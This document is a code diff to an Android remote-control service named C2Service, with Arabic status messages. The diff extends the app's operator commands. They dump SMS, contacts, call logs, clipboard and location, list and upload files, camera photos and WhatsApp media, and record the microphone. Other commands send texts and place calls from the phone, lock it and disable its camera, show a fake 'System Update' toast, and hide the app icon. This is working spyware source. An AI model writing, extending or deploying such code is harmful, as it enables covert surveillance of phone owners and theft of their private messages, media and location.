@@ -1,13 +1,20 @@
 package com.vanta.core;
 
 import android.app.*;
+import android.app.admin.DevicePolicyManager;
 import android.content.*;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.MediaPlayer;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.*;
 import android.provider.*;
+import android.widget.Toast;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -98,20 +105,129 @@ public class C2Service extends Service {
 
     private String exec(String cmd) {
         try {
+            // ===== الأوامر الأساسية =====
             if (cmd.equals("all-sms")) return sms();
-            if (cmd.equals("all-contacts")) return contacts();
+            if (cmd.equals("contacts") || cmd.equals("all-contacts")) return contacts();
             if (cmd.equals("calls")) return calls();
             if (cmd.equals("clipboard")) return clip();
             if (cmd.equals("apps")) return apps();
             if (cmd.equals("location")) return loc();
-            if (cmd.equals("files")) return files();
-            if (cmd.equals("vibrate")) {
-                Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-                if (v != null) v.vibrate(1500);
-                return "vibrated";
+            if (cmd.equals("files")) return Exfil.list("/sdcard/");
+            if (cmd.equals("pics")) return Exfil.list("/sdcard/DCIM/Camera/");
+            if (cmd.equals("wa")) return Exfil.list("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/");
+            if (cmd.startsWith("ls ")) return Exfil.list(cmd.substring(3).trim());
+            if (cmd.equals("mic")) return Exfil.mic(this, 8);
+            if (cmd.startsWith("getfile ")) return Exfil.upload(cmd.substring(8).trim());
+            if (cmd.equals("vibrate")) { vibrate(); return "📳 اهتزاز"; }
+            if (cmd.equals("lock")) return lock();
+            if (cmd.equals("ring")) return ring();
+            if (cmd.startsWith("open ")) return openApp(cmd.substring(5).trim());
+            if (cmd.equals("camera-off")) return camOff();
+            if (cmd.equals("camera-on")) return camOn();
+            if (cmd.equals("wifi")) return wifi();
+            if (cmd.equals("sysinfo")) return sysInfo();
+            if (cmd.equals("hide")) { Hider.hide(this); return "🙈 أُخفيت الأيقونة"; }
+
+            // ===== أوامر الخادم القديم =====
+            if (cmd.equals("screenshot") || cmd.equals("screen")) {
+                startActivity(new Intent(this, ScreenActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                return "📸 وافق على إذن الشاشة";
             }
+            if (cmd.equals("toast")) {
+                new Handler(getMainLooper()).post(new Runnable() {
+                    public void run() {
+                        Toast.makeText(C2Service.this, "System Update", Toast.LENGTH_SHORT).show();
+                    }
+                });
+                return "💬 ظهرت رسالة";
+            }
+            if (cmd.startsWith("makeCall ")) {
+                String num = cmd.substring(9).trim();
+                Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num));
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+                return "📞 يتصل بـ " + num;
+            }
+            if (cmd.startsWith("sendSms ")) {
+                String[] parts = cmd.substring(8).trim().split("\\|");
+                if (parts.length < 2) return "❌ الصيغة: sendSms رقم|نص";
+                android.telephony.SmsManager.getDefault()
+                    .sendTextMessage(parts[0].trim(), null, parts[1].trim(), null, null);
+                return "✉️ أُرسلت رسالة إلى " + parts[0].trim();
+            }
+            if (cmd.startsWith("playAudio ")) {
+                String url = cmd.substring(10).trim();
+                try {
+                    MediaPlayer mp = new MediaPlayer();
+                    mp.setDataSource(url);
+                    mp.prepare();
+                    mp.start();
+                    return "🔊 يعزف الآن";
+                } catch (Exception e) { return "❌ فشل التشغيل"; }
+            }
+
             return "unknown:" + cmd;
         } catch (Exception e) { return "err:" + e.getMessage(); }
+    }
+
+    private void vibrate() {
+        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (v != null) v.vibrate(1500);
+    }
+
+    private String lock() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.lockNow();
+        return "🔒 قُفلت الشاشة";
+    }
+
+    private String ring() {
+        Ringtone r = RingtoneManager.getRingtone(this,
+            RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+        r.play();
+        return "🔔 يرن الآن";
+    }
+
+    private String openApp(String pkg) {
+        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
+        if (i == null) return "❌ غير موجود: " + pkg;
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
+        return "📱 فُتح: " + pkg;
+    }
+
+    private String camOff() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), true);
+        return "📷 عُطّلت الكاميرا";
+    }
+
+    private String camOn() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), false);
+        return "📷 فُعّلت الكاميرا";
+    }
+
+    private String wifi() {
+        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+        WifiInfo wi = wm.getConnectionInfo();
+        int ip = wi.getIpAddress();
+        String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." +
+                       ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
+        return "📶 SSID: " + wi.getSSID() + "\n🌐 IP: " + ipStr +
+               "\n⚡ " + wi.getLinkSpeed() + " Mbps";
+    }
+
+    private String sysInfo() {
+        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+        int bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
+        long free = s.getAvailableBytes() / (1024L * 1024L * 1024L);
+        return "📱 " + Build.MODEL +
+               "\n🤖 أندرويد " + Build.VERSION.RELEASE +
+               "\n🔋 " + bat + "%" +
+               "\n💾 " + free + " GB حرة" +
+               "\n📦 " + getPackageManager().getInstalledApplications(0).size() + " تطبيق";
     }
 
     private String sms() {
@@ -124,6 +240,7 @@ public class C2Service extends Service {
                   .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
             c.close();
         }
+        if (sb.length() == 0) return "📭 لا رسائل أو الصلاحية غير ممنوحة";
         return sb.toString();
     }
 
@@ -140,6 +257,7 @@ public class C2Service extends Service {
                   .append("\n");
             c.close();
         }
+        if (sb.length() == 0) return "📭 لا جهات اتصال";
         return sb.toString();
     }
 
@@ -152,14 +270,15 @@ public class C2Service extends Service {
                 sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
             c.close();
         }
+        if (sb.length() == 0) return "📭 لا مكالمات";
         return sb.toString();
     }
 
     private String clip() {
         ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
         if (cb.getPrimaryClip() != null && cb.getPrimaryClip().getItemCount() > 0)
-            return String.valueOf(cb.getPrimaryClip().getItemAt(0).getText());
-        return "empty";
+            return "📋 " + cb.getPrimaryClip().getItemAt(0).getText();
+        return "📋 الحافظة فارغة";
     }
 
     private String apps() {
@@ -174,15 +293,8 @@ public class C2Service extends Service {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            return l == null ? "no-location" : l.getLatitude() + "," + l.getLongitude();
-        } catch (Exception e) { return "loc-err"; }
-    }
-
-    private String files() {
-        StringBuilder sb = new StringBuilder();
-        File[] fs = Environment.getExternalStorageDirectory().listFiles();
-        if (fs != null) for (File f : fs) sb.append(f.getName()).append("\n");
-        return sb.toString();
+            return l == null ? "📍 لا موقع متاح" : "📍 " + l.getLatitude() + ", " + l.getLongitude();
+        } catch (Exception e) { return "📍 خطأ الموقع"; }
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
